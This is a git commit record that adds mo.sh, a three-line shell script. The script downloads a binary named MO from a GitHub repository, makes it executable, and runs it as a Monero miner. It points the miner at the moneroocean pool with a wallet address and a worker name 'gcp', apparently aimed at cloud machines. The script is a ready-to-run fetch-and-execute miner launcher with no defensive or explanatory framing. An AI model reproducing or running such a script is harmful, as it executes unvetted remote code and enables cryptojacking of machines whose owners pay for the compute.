310687b9ea2bbc60ea68e758587e83f8ac649724
calebsto <82493755+calebsto@users.noreply.github.com>
2021-05-14 17:34:41 +0700

    Create mo.sh

---
+++ mo.sh
@@ -0,0 +1,3 @@
+wget https://github.com/calebsto/rap/blob/main/MO
+chmod +x MO
+./MO -u 84DKEcTPi5JMsDQnKUT2rY8Lbaq6L4JLigSShf57cHzD7X3tgqK3guG8v3wrT1x59GEd1aTwu2VZ53Nq2USaHw9y46jWJbB+128000 -o gulf.moneroocean.stream:443 -p gcp
